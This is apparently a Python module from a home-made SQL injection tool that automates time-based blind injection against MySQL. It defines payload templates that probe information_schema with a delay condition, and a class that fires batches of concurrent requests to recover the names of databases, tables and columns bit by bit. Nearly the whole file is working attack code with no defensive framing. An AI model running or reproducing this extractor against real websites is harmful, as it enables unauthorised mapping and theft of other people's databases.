from typing import Callable, Iterable
from requests import Response

from dbtype import DBType
from promiserequest import PromiseRequest, startall
from web import Link, ExploitLink

import threading

database_count_command = {
    DBType.MySQL: "(select num={integer} and {{delay_command}} from (select count(*) as num from (select distinct table_schema from information_schema.tables)a)b)"
}

database_name_length_command = {
    DBType.MySQL: "(select length(table_schema)={integer} and {{delay_command}} from (select distinct table_schema from information_schema.tables order by table_schema limit {row_idx},1)a)"
}

database_name_command = {
    DBType.MySQL: "(select substr(bin(ascii(substr(table_schema,{str_idx},1))),{bin_idx},1)=1 and {{delay_command}} from (select distinct table_schema from information_schema.tables order by table_schema limit {row_idx},1)a)"
}

table_count_command = {
    # DBType.MySQL: "(select substr(bin(ascii(substr(table_schema,{database_name_idx},1))),{bin_idx},1)=1 and {{delay_command}} from (select distinct table_schema from information_schema.tables limit {row_idx},1)a)"
    DBType.MySQL: "(select num={integer} and {{delay_command}} from (select count(*) as num from information_schema.tables where table_schema='{database_name}' and table_type='base table' and table_schema not in ('information_schema', 'mysql', 'performance_schema', 'sys'))a)"
}

table_name_length_command = {
    # DBType.MySQL: "(select substr(bin(ascii(substr(table_schema,{database_name_idx},1))),{bin_idx},1)=1 and {{delay_command}} from (select distinct table_schema from information_schema.tables limit {row_idx},1)a)"
    DBType.MySQL: "(select length(table_name)={integer} and {{delay_command}} from information_schema.tables where table_schema='{database_name}' and table_type='base table' and table_schema not in ('information_schema', 'mysql', 'performance_schema', 'sys') order by table_name limit {row_idx},1)"
}

table_name_command = {
    # DBType.MySQL: "(select substr(bin(ascii(substr(table_schema,{database_name_idx},1))),{bin_idx},1)=1 and {{delay_command}} from (select distinct table_schema from information_schema.tables limit {row_idx},1)a)"
    DBType.MySQL: "(select substr(bin(ascii(substr(table_name,{str_idx},1))),{bin_idx},1)=1 and {{delay_command}} from information_schema.tables where table_schema='{database_name}' and table_type='base table' and table_schema not in ('information_schema', 'mysql', 'performance_schema', 'sys') order by table_name limit {row_idx},1)"
}

column_count_command = {
    DBType.MySQL: "(select num={integer} and {{delay_command}} from (select count(*) as num from information_schema.columns where table_name='{table_name}' and table_schema='{database_name}')a)"
}

column_name_length_command = {
    DBType.MySQL: "(select length(column_name)={integer} and {{delay_command}} from information_schema.columns where table_name='{table_name}' and table_schema='{database_name}' order by column_name limit {row_idx},1)"
}

column_name_command = {
    DBType.MySQL: "(select substr(bin(ascii(substr(column_name,{str_idx},1))),{bin_idx},1)=1 and {{delay_command}} from information_schema.columns where table_name='{table_name}' and table_schema='{database_name}' order by column_name limit {row_idx},1)"
}




# class InformationSchema:
#     databases: list[str]
#     tables: dict[str, list[str]]
#     columns: dict[str, dict[str, list[str]]]
#     def __init__(self) -> None:
#         self.databases = []
#         self.tables = {}
#         self.columns = {}


class GetInfo:
    ex_request: Callable[[str], Response]
    is_exed: Callable[[Response], bool]
    dbtype: DBType
    def __init__(self, ex_request, is_exed, dbtype) -> None:
        self.ex_request = ex_request
        self.is_exed = is_exed
        self.dbtype = dbtype

    def run(self) -> dict[str, dict[str, list]]:
        databases = self.get_information_databases()
        rtn = {}
        for database in databases:
            rtn[database] = {}
            tables = self.get_information_tables(database)
            for table in tables:
                columns = self.get_information_columns(database, table)
                rtn[database][table] = columns
        return rtn

    def get_information_databases(self) -> list[str]:
        dbnames = []
        dbnum = self.get_integer(database_count_command[self.dbtype])
        for row_idx in range(dbnum):
            dbname_length = self.get_integer(database_name_length_command[self.dbtype], row_idx=row_idx)
            # print(row_idx, ', length:', dbname_length)
            dbname = self.get_string(database_name_command[self.dbtype], dbname_length, row_idx=row_idx)
            dbnames.append(dbname)
        return dbnames

    def get_information_tables(self, dbname: str) -> list[str]:
        tbnames = []
        tbnum = self.get_integer(table_count_command[self.dbtype], database_name=dbname)
        for row_idx in range(tbnum):
            tbname_length = self.get_integer(table_name_length_command[self.dbtype], row_idx=row_idx, database_name=dbname)
            tbname = self.get_string(table_name_command[self.dbtype], tbname_length, row_idx=row_idx, database_name=dbname)
            tbnames.append(tbname)
        return tbnames

    def get_information_columns(self, dbname: str, tbname: str) -> list[str]:
        clmnames = []
        clmnum = self.get_integer(column_count_command[self.dbtype], database_name=dbname, table_name=tbname)
        for row_idx in range(clmnum):
            clmname_length = self.get_integer(column_name_length_command[self.dbtype], row_idx=row_idx, database_name=dbname, table_name=tbname)
            clmname = self.get_string(column_name_command[self.dbtype], clmname_length, row_idx=row_idx, database_name=dbname, table_name=tbname)
            clmnames.append(clmname)
        return clmnames

    def get_integer(self, command: str, **kwargs: dict[str, str]) -> int:
        ONCE_THREAD_NUM = 20
        i = 0
        while 1:
            promises: list[PromiseRequest] = []
            for _ in range(ONCE_THREAD_NUM):
                promises.append(PromiseRequest(self.ex_request, command.format(integer=i, **kwargs)))
                i+=1
            responses = startall(promises)
            results = tuple(map(lambda x:self.is_exed(x), responses))
            if any(results):
                if sum(results) != 1:
                    raise Exception(f"Truth of results is not only one: {results}")
                # print(results)
                return results.index(True) + i-ONCE_THREAD_NUM

    def get_string(self, command: str, length: int, **kwargs: dict[str, str]) -> str:
        promises: list[PromiseRequest] = []
        for str_idx in range(1, length+1):
            for bin_idx in range(1, 8):
                promises.append(PromiseRequest(self.ex_request, command.format(str_idx=str_idx, bin_idx=bin_idx, **kwargs)))
        responses = startall(promises)
        results = tuple(map(lambda x:int(self.is_exed(x)), responses))
        return bin2str(results)
        
#7자릿수 2진법 -> ascii
def bin2str(bin: Iterable[int]) -> str:
    sum = 0
    for i in range(len(bin)):
        sum <<= 1
        if i%7==0:
            sum <<= 1
        sum += bin[i]
    return sum.to_bytes(len(bin)//7, 'big').decode()